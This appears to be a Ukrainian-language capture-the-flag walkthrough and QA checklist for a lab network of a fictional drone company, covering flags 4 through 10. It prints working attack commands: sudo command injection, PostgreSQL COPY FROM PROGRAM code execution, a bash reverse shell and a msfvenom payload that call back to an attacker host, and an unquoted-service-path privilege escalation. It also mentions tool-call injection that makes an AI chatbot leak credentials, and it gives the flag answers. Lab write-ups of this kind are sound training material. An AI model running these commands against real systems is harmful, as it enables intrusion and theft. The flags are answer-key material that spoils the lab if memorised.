# SkyRift NEW — Walkthrough (Нові прапори: Flag_4 – Flag_10)

> Цей документ описує лише новий ланцюг (прапори 4–10), доданий у SkyRift NEW.
> Попередні прапори (1–3) та після (11–21) лишаються без змін.

---

## Загальна схема нового ланцюга

```
[Phase 2.3: AI-чатбот]   flag_3 = flag{try_to_connect}
        | chatbot leak → operator / 3edcVFR456 → 192.168.125.55 (firewall → 10.10.50.50)
        v
[10.10.50.50 — operator]  Flag_4: flag{n1ce_t0_s33_y0u}
        | sudo -l → vulnerable script → command injection → commador
        v
[10.10.50.50 — commador]  Flag_5: flag{Y0u_l1ke_privileges}
        | /home/commador/scripts/backup_db.sh → DB creds in comment
        v
[10.10.50.100 — PostgreSQL — tech2]  Flag_6: flag{adfGt54DCf}
        | COPY ... FROM PROGRAM → RCE → reverse shell as postgres
        v
[10.10.50.100 — shell/postgres]  Flag_7: flag{0mg_RC3}
        | network recon → 10.10.50.150 open SMB
        v
[10.10.50.150 — SMB anonymous share]  Flag_8: flag{sh4r3_1s_c4r3}
        | svc_deploy creds from deploy_update.ps1 → login → unquoted path
        v
[10.10.50.150 — SYSTEM via DroneUpdateAgent]  Flag_9: flag{unqu0ted_p4th_pwn}
        | admin shell → registry / ProgramData → grayraven creds
        v
Flag_10: flag{f0und_th3_k3ys}  +  credentials → Update Server
```

---

## Flag_3 — зміна виходу Phase 2.3 (AI-чатбот)

**Що змінилось:** Чат-бот більше не видає SSH-креди до Update Server напряму.

**Новий вміст `secret_config.ini`:**
```ini
# Config for drone operator console access
[internal]
flag_3       = "flag{try_to_connect}"
server_ip    = "192.168.125.55"
ssh_login    = "operator"
ssh_password = "3edcVFR456"
```

**Дія учасника:** Через tool call injection чат-бот повертає цей файл. Учасник отримує `flag_3` і бачить нові SSH-креди до оператора дронів.

---

## Flag_4 — Operator_station (10.10.50.50), user `operator`

### Вхід
```bash
ssh operator@192.168.125.55
# пароль: 3edcVFR456
```
> Firewall форвардить 192.168.125.55:22 → 10.10.50.50:22

### Прапор
```bash
cat ~/flag.txt
# flag{n1ce_t0_s33_y0u}
```

### Що бачить учасник
- Повноцінна робоча станція оператора дронів (~/missions, ~/logs, ~/shift_reports)
- Конфіги PX4 Autopilot в `~/.px4/config/`
- QGroundControl AppImage в `~/Applications/`
- `~/.bash_history` з слідами реальних команд (зокрема `sudo -l`)

---

## Flag_5 — Privilege Escalation: operator → commador

### Крок 1: Знайти дозволений sudo-скрипт
```bash
sudo -l
```

Виведення:
```
(commador) NOPASSWD: /opt/dronecorp/tools/flight_log_export.py
```

### Крок 2: Прочитати скрипт — знайти вразливість
```bash
cat /opt/dronecorp/tools/flight_log_export.py
```

Скрипт використовує `os.system(f"cp /var/log/dronecorp/{log_name} ...")` — command injection через несанітизоване введення.

### Крок 3: Експлуатація
```bash
sudo -u commador /opt/dronecorp/tools/flight_log_export.py
```
```
Enter log filename to export: ; /bin/bash ;
```

Учасник отримує bash-сесію від імені `commador`.

### Прапор
```bash
cat /home/commador/flag.txt
# flag{Y0u_l1ke_privileges}
```

---

## Flag_6 — DB_station PostgreSQL, user `tech2`

### Крок 1: Знайти креди БД у файлах commador

```bash
cat /home/commador/scripts/backup_db.sh
```
```bash
# host: 10.10.50.100
# user: tech2
# pass: adfGt54DCf
```

### Крок 2: Підключитись до БД
```bash
psql -h 10.10.50.100 -U tech2 -d dronecorp_db
# пароль: adfGt54DCf
```

### Прапор
Пароль `tech2` є прапором:
```
flag{adfGt54DCf}
```

### Що бачить учасник в БД
```sql
\dt
-- 15 таблиць: drones, pilots, flight_logs, telemetry_positions, geofence_zones,
--             maintenance_records, mission_reports, firmware_versions,
--             firmware_update_schedule, base_locations, squadrons, suppliers,
--             spare_parts_inventory, software_licenses, flight_plans

SELECT COUNT(*) FROM drones;        -- 25 записів
SELECT COUNT(*) FROM flight_logs;   -- 25 записів
-- і так далі для кожної таблиці
```

---

## Flag_7 — PostgreSQL RCE (COPY TO PROGRAM)

### Крок 1: Перевірити superuser-права
```sql
SELECT current_user, pg_has_role(current_user, 'pg_execute_server_program', 'usage');
-- або просто спробувати COPY
```

### Крок 2: RCE — виконання команд
```sql
CREATE TABLE cmd_exec (output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
-- uid=111(postgres) gid=117(postgres) groups=117(postgres)
```

```sql
COPY cmd_exec FROM PROGRAM 'ls /var/lib/postgresql/';
SELECT * FROM cmd_exec;
-- flag.txt  ...
```

### Крок 3: Прочитати прапор
```sql
COPY cmd_exec FROM PROGRAM 'cat /var/lib/postgresql/flag.txt';
SELECT * FROM cmd_exec;
-- flag{0mg_RC3}
```

### Крок 4: Reverse shell (опціонально, для інтерактивної сесії)

На атакуючій машині:
```bash
nc -lvnp 4444
```

В psql:
```sql
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"';
```

---

## Flag_8 — Windows Server 2019 (10.10.50.150): Anonymous SMB

### Крок 1: Виявлення (recon з commador або postgres shell)
```bash
nmap -p 445 10.10.50.0/24 --open
# або
nmap -sV 10.10.50.150
```

Також: у файлах commador є посилання на 10.10.50.150 (листування IT, план Q3).

### Крок 2: Анонімний доступ до SMB
```bash
smbclient -L //10.10.50.150 -N
# або
smbmap -H 10.10.50.150 -u "" -p ""
```

Виведення:
```
Sharename   Type   Comment
Updates     Disk   DroneCorp Firmware Update Distribution Share
```

### Крок 3: Завантажити файли
```bash
smbclient //10.10.50.150/Updates -N
smb: \> ls
smb: \> get flag.txt
smb: \> get deploy_update.ps1
```

**Прапор:**
```
flag{sh4r3_1s_c4r3}
```

### Крок 4: Знайти креди в deploy_update.ps1
```powershell
$svcUser = "svc_deploy"
$svcPass = "Deploy@2024!Drone"   # <-- TODO: remove hardcoded password!
```

---

## Flag_9 — Windows Server 2019: Unquoted Service Path

### Крок 1: Увійти як svc_deploy

```bash
# Via WinRM (якщо відкритий порт 5985):
evil-winrm -i 10.10.50.150 -u svc_deploy -p "Deploy@2024!Drone"
# або RDP / impacket psexec
```

### Крок 2: Знайти вразливий сервіс

```powershell
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"
```

Виведення:
```
DroneUpdateAgent  C:\Program Files\Drone Update Agent\agent.exe  Auto
```

**Вразливість:** шлях без лапок і з пробілом. Windows шукає виконуваний файл у такому порядку:
1. `C:\Program.exe`
2. `C:\Program Files\Drone.exe`   ← тут ми пишемо!
3. `C:\Program Files\Drone Update.exe`
4. `C:\Program Files\Drone Update Agent\agent.exe`

### Крок 3: Перевірити права запису

```powershell
icacls "C:\Program Files"
# Everyone: W (write) — вразливість підтверджена
```

### Крок 4: Підготувати payload

```bash
# На Kali: створити реверс-шелл виконуваний файл
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=5555 -f exe -o Drone.exe
```

```powershell
# Завантажити на Windows сервер
Invoke-WebRequest http://<ATTACKER_IP>/Drone.exe -OutFile "C:\Program Files\Drone.exe"
```

### Крок 5: Запустити listener і перезапустити сервіс

На атакуючій машині:
```bash
nc -lvnp 5555
```

На Windows:
```powershell
sc.exe stop DroneUpdateAgent
sc.exe start DroneUpdateAgent
# або: Restart-Service DroneUpdateAgent
```

Отримуємо SYSTEM shell.

### Крок 6: Прочитати прапор

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```
```
flag{unqu0ted_p4th_pwn}
```

---

## Flag_10 — Фінальні креди Update Server

З SYSTEM-сесії:

### Варіант A — Реєстр
```powershell
reg query HKLM\SOFTWARE\DroneCorp\UpdateSync
```
```
server_ip     REG_SZ  192.168.125.55
ssh_login     REG_SZ  grayraven
ssh_password  REG_SZ  grayraven124
flag_final    REG_SZ  flag{f0und_th3_k3ys}
```

### Варіант B — Конфіг-файл
```powershell
type C:\ProgramData\DroneOps\update_server.conf
```
```ini
[UpdateServer]
server_ip    = 192.168.125.55
ssh_login    = grayraven
ssh_password = grayraven124

[Flags]
flag_final   = flag{f0und_th3_k3ys}
```

**Прапор:** `flag{f0und_th3_k3ys}`

**Отримані креди:**
- IP: `192.168.125.55` (firewall → Update Server)
- Login: `grayraven`
- Password: `grayraven124`

---

## Далі → Update Server (існуючий ланцюг)

```bash
ssh grayraven@192.168.125.55
# пароль: grayraven124
```

Продовжується з Flag_11 (`flag{update_server_compromised}`) згідно з оригінальним walkthrough.

---

## Зведена таблиця прапорів (новий ланцюг)

| Прапор | Значення | Де знайти | Техніка |
|--------|---------|-----------|---------|
| Flag_3 | `flag{try_to_connect}` | AI-чатбот secret_config.ini | Tool call injection (без змін) |
| **Flag_4** | `flag{n1ce_t0_s33_y0u}` | `/home/operator/flag.txt` | SSH з кредами з чатбота |
| **Flag_5** | `flag{Y0u_l1ke_privileges}` | `/home/commador/flag.txt` | Sudo + command injection у Python-скрипті |
| **Flag_6** | `flag{adfGt54DCf}` | Пароль tech2 у PostgreSQL | Знайдено у backup_db.sh |
| **Flag_7** | `flag{0mg_RC3}` | `/var/lib/postgresql/flag.txt` | PostgreSQL COPY FROM PROGRAM (RCE) |
| **Flag_8** | `flag{sh4r3_1s_c4r3}` | `\\10.10.50.150\Updates\flag.txt` | Anonymous SMB |
| **Flag_9** | `flag{unqu0ted_p4th_pwn}` | `C:\Users\Administrator\Desktop\flag.txt` | Unquoted Service Path → SYSTEM |
| **Flag_10** | `flag{f0und_th3_k3ys}` | Registry / ProgramData\DroneOps | Admin shell → знайти конфіг |

---

## Корисні команди для QA-перевірки

### Operator_station
```bash
# Перевірити users
id operator commador

# Перевірити sudo
sudo -l -U operator
# Має бути: (commador) NOPASSWD: /opt/dronecorp/tools/flight_log_export.py

# Перевірити isolat. commador від operator
sudo -u operator ls /home/commador
# Permission denied

# Перевірити Flag_4
cat /home/operator/flag.txt

# Тест privesc
echo '; id ;' | sudo -u commador /opt/dronecorp/tools/flight_log_export.py
# uid=1001(commador)
```

### DB_station
```bash
# Підключення до БД
psql -h 10.10.50.100 -U tech2 -d dronecorp_db -c "\dt"

# Перевірити superuser
psql -h 10.10.50.100 -U tech2 -d dronecorp_db -c "SELECT rolsuper FROM pg_roles WHERE rolname='tech2';"
# t

# Тест RCE
psql -h 10.10.50.100 -U tech2 -d dronecorp_db -c "CREATE TABLE t (o text); COPY t FROM PROGRAM 'id'; SELECT * FROM t;"

# Flag_7
psql -h 10.10.50.100 -U tech2 -d dronecorp_db -c "COPY t FROM PROGRAM 'cat /var/lib/postgresql/flag.txt'; SELECT * FROM t;"
```

### Windows Server
```powershell
# Перевірити share
Get-SmbShare -Name Updates
Get-SmbShareAccess -Name Updates

# Перевірити unquoted service path
sc.exe qc DroneUpdateAgent
# BINARY_PATH_NAME: C:\Program Files\Drone Update Agent\agent.exe  (без лапок!)

# Перевірити права запису
icacls "C:\Program Files" | findstr Everyone
# Everyone:(W)

# Перевірити svc_deploy не бачить Flag_10
icacls "C:\ProgramData\DroneOps\update_server.conf"
# svc_deploy: Deny Read
```
